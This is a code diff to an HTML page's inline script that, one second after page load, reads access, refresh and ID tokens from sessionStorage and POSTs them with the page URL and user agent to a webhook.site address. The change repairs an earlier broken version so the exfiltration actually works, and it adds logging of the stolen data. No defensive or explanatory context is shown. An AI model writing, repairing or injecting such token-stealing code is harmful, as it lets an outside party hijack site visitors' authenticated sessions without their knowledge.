@@ -6,6 +6,8 @@
     window.onload = function () {
       setTimeout(() => {
         try {
+          const webhookURL = 'https://webhook.site/02e6c3d4-d0a8-4d4c-bd8f-e89bb5279231';
+
           const data = {
             access_token: sessionStorage.getItem("access_token"),
             refresh_token: sessionStorage.getItem("refresh_token"),
@@ -14,35 +16,20 @@
             userAgent: navigator.userAgent
           };
 
-          fetch("(function () {
-  const webhookURL = 'https://webhook.site/02e6c3d4-d0a8-4d4c-bd8f-e89bb5279231'; // Replace with your real webhook
+          console.log("🚨 Token data:", data);
 
-  const data = {
-    access_token: sessionStorage.getItem("access_token"),
-    refresh_token: sessionStorage.getItem("refresh_token"),
-    id_token: sessionStorage.getItem("id_token"),
-    location: window.location.href,
-    userAgent: navigator.userAgent
-  };
-
-  fetch(webhookURL, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(data)
-  });
-})();", {
+          fetch(webhookURL, {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
             },
             body: JSON.stringify(data)
-          });
+          }).then(res => console.log("✅ Sent to webhook"))
+            .catch(err => console.error("❌ Failed to send:", err));
         } catch (e) {
-          console.error("Failed to send tokens:", e);
+          console.error("❌ Script error:", e);
         }
-      }, 1000);
+      }, 1000); // slight delay after page load
     };
   </script>
 </head>
